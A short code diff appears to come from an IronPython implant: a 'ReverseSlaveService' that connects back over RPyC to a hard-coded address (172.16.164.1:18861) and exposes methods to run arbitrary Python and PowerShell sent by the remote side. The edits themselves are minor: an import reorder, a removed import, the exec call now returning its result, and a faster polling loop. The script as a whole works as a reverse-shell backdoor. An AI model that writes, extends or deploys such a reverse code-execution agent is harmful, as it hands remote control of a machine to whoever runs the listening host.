@@ -4,9 +4,8 @@ import clr
 import rpyc
 import locale
 import traceback
-import threading
 from rpyc.core.service import Service, ModuleNamespace
-from rpyc.lib.compat import execute, is_py3k
+from rpyc.lib.compat import is_py3k, execute
 from time import sleep
 #clr.AddReference("IronPython")
 #clr.AddReference('IronPython.Modules')
@@ -97,7 +96,7 @@ class ReverseSlaveService(Service):
 
     def exposed_execute(self, text):
         """execute arbitrary code (using ``exec``)"""
-        execute(text, self.exposed_namespace)
+        return execute(text, self.exposed_namespace)
 
     def exposed_ps_execute(self, text):
         """execute powershell in a unmanaged runspace"""
@@ -145,4 +144,4 @@ conn = rpyc.connect("172.16.164.1", 18861, service=ReverseSlaveService, keepaliv
 bgsrv = rpyc.BgServingThread(conn)
 
 while True:
-    sleep(1)
+    sleep(0.1)
